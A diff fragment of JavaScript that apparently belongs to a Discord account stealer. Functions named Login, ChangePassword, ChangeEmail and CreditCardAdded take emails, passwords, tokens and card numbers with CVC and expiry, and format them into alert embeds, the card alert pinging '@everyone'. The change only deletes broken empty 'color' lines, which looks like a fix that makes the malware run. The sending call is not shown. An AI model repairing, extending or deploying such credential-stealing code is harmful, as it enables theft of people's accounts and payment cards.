@@ -144,7 +144,6 @@ function Login(email, password, token) {
             content: "",
             embeds: [
                 {
-                    "color": ,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -185,7 +184,6 @@ function ChangePassword(oldpassword, newpassword, token) {
             content: "",
             embeds: [
                 {
-                    "color": ,
                     "fields": [
                         {
                             "name": "**Password Changed**",
@@ -231,7 +229,6 @@ function ChangeEmail(newemail, password, token) {
             content: "",
             embeds: [
                 {
-                    "color": ,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -277,7 +274,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             content: "@everyone",
             embeds: [
                 {
-                    "color": ,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
